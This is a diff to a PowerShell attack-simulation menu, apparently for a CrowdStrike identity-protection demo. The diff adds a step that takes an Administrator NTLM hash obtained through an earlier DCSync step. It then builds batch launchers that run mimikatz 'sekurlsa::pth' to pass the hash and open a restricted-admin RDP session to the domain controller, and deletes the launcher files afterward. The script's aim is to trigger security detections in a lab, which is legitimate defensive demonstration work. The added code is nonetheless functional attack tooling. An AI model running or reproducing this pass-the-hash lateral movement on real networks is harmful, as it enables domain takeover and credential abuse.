@@ -1,7 +1,7 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  CrowdStrike NGSIEM + Identity Protection Demo
-#  Version: 5.6.1 (2026-04-03)
+#  Version: 5.7 (2026-04-03)
 #
 #  Attack narrative:
 #    1. Phishing campaign (narrative)
@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.6.1"
+$scriptVersion = "5.7"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -683,6 +683,58 @@ public class CryptoMD4 {
                     if ($dcsyncContent -notmatch "Hash NTLM") {
                         Write-Host "  [-] No hashes in output. DCSync may have failed." -ForegroundColor Yellow
                         Write-Host "  [*] Check DT for error details." -ForegroundColor Yellow
+                    }
+
+                    # --- Step 6c: Attempt RDP to DC as Administrator ---
+                    if ($adminHash) {
+                        Write-Host
+                        Write-Host "  --- 6c: RDP to DC as Administrator (should be BLOCKED) ---" -ForegroundColor Yellow
+                        Write-Host "  [*] Using stolen Administrator hash to attempt RDP to DC." -ForegroundColor White
+                        Write-Host "  [*] This simulates the attacker trying to reach the crown jewel." -ForegroundColor White
+                        Write-Host "  [*] CrowdStrike IDP should BLOCK or DETECT this attempt." -ForegroundColor White
+                        Write-Host
+                        Write-Host "  [!] TRIGGERS: PtH lateral movement to DC" -ForegroundColor Red
+                        Write-Host
+
+                        $doRdp = Read-Host "  Attempt RDP to DC? (Y/n)"
+                        if ($doRdp -ne 'n') {
+                            # Write mstsc wrapper (no-space path for /run:)
+                            $rdpWrapper = "$idpDir\rdp_dc_go.bat"
+                            [System.IO.File]::WriteAllText($rdpWrapper, "@mstsc /v:$env:ENV_DC_IP /restrictedadmin`r`n", [System.Text.Encoding]::ASCII)
+
+                            # Write PtH launcher
+                            $rdpLauncher = "$idpDir\launch_rdp_dc.bat"
+                            $sb3 = New-Object System.Text.StringBuilder
+                            [void]$sb3.AppendLine('@echo off')
+                            [void]$sb3.AppendLine('echo [*] PtH as Administrator - attempting RDP to DC...')
+                            [void]$sb3.AppendLine('echo [*] CrowdStrike should block this attempt.')
+                            [void]$sb3.AppendLine('echo.')
+                            [void]$sb3.Append('"')
+                            [void]$sb3.Append($mimiExe)
+                            [void]$sb3.Append('" "privilege::debug" "sekurlsa::pth /user:Administrator /domain:')
+                            [void]$sb3.Append($env:ENV_DOMAIN)
+                            [void]$sb3.Append(' /ntlm:')
+                            [void]$sb3.Append($adminHash)
+                            [void]$sb3.Append(' /run:')
+                            [void]$sb3.Append($rdpWrapper)
+                            [void]$sb3.AppendLine('" "exit"')
+                            [System.IO.File]::WriteAllText($rdpLauncher, $sb3.ToString(), [System.Text.Encoding]::ASCII)
+
+                            try {
+                                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$rdpLauncher`""
+                                Write-Host
+                                Write-Host "  [+] RDP attempt launched in new window." -ForegroundColor Green
+                                Write-Host "  [*] Watch for the RDP window - it should fail or be blocked." -ForegroundColor Cyan
+                                Write-Host "  [*] Check CrowdStrike console for the detection." -ForegroundColor Cyan
+                            } catch {
+                                Write-Host "  [!] Error: $_" -ForegroundColor Red
+                            }
+
+                            # Brief pause then cleanup launcher files
+                            Start-Sleep -Seconds 5
+                            Remove-Item $rdpWrapper -Force -ErrorAction SilentlyContinue
+                            Remove-Item $rdpLauncher -Force -ErrorAction SilentlyContinue
+                        }
                     }
                 } else {
                     Write-Host "  [!] No output after ${maxWait}s." -ForegroundColor Red
